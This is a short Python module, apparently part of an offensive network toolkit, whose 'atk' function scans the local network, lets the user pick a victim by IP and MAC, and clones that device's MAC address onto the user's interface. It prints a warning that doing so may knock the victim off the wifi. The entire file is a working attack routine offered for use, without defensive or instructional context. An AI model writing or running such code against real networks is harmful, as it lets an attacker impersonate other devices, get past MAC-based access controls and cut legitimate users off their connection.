import os

from scapy.fields import LongField

from mod.basic.scan import atk as scan
from mod.system.system_config.logo_display import logo_print
from mod.system.system_config.mac_gen import mac_new

def atk():
    os.system("ifconfig")
    iface = input("enter interface: ")

    out = scan(True)
    print("   IP" + " "*18+"MAC")
    for x in range(len(out)):
        i = out[x]
        print(str(x)+") "+"{:16}    {}".format(i['ip'], i['mac']))

    valid = False
    while not valid:
        try:
            num = int(input("enter target ip num: "))
            valid = True
        except Exception:
            print("[!] int not str")
    ip = out[num]['ip']
    mac = out[num]['mac']
    os.system("clear")
    logo_print()
    print("[IP] "+ip)
    print("[MAC] "+mac)
    print("[IFACE] "+iface)

    print("[!] changin mac, this could kick the user off the wifi, standby...")
    mac_new(iface, mac)
    print("done!")